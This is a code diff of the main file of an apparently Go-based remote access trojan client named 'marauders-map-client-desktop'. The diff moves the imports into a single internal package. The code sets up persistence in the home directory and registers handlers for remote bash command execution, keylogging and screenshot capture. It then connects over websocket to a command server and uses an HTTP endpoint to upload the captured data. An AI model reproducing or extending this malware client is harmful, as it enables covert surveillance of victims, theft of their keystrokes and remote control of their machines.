@@ -1,10 +1,7 @@
 package main
 
 import (
-	"marauders-map-client-desktop/internal/deploy"
-	"marauders-map-client-desktop/internal/screen"
-	"marauders-map-client-desktop/internal/wsclient"
-	"marauders-map-client-desktop/internal/wsclient/observer"
+	"marauders-map-client-desktop/internal"
 )
 
 func main() {
@@ -12,16 +9,16 @@ func main() {
 	// Deploy for persistence
 	// this setups home directory folder for the program
 	// folder strcuture & persist mechanism
-	deploy.Deploy()
+	internal.Deploy()
 
 	// Initialize Observer for processing incoming
 	// commands from server
-	screenrecorder := screen.NewScreenRecorder(5)
+	screenrecorder := internal.NewScreenRecorder(5)
 
-	subject := &observer.Subject{}
-	subject.AddListener(observer.NewBashExecutorObserver())
-	subject.AddListener(observer.NewKeyloggerCmdObserver())
-	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))
+	subject := &internal.Subject{}
+	subject.AddListener(internal.NewBashExecutorObserver())
+	subject.AddListener(internal.NewKeyloggerCmdObserver())
+	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder))
 
 	// ===========================================================================
 	// Start connection and communication with server
@@ -29,11 +26,11 @@ func main() {
 	// for processing commands
 	// ===========================================================================
 	// Creates WSClient configurations
-	wscconf := wsclient.NewWSConfiguration("ws", "localhost", "8080", "/accesspoint")
-	httpconf := wsclient.NewHTTPConfiguration("http", "localhost", "80", "/upload")
+	wscconf := internal.NewWSConfiguration("ws", "localhost", "8080", "/accesspoint")
+	httpconf := internal.NewHTTPConfiguration("http", "localhost", "80", "/upload")
 
 	// Creates WSClient
-	wsc := wsclient.NewWSClient(wscconf, httpconf)
+	wsc := internal.NewWSClient(wscconf, httpconf)
 	wsc.StartCommunications(subject)
 
 }
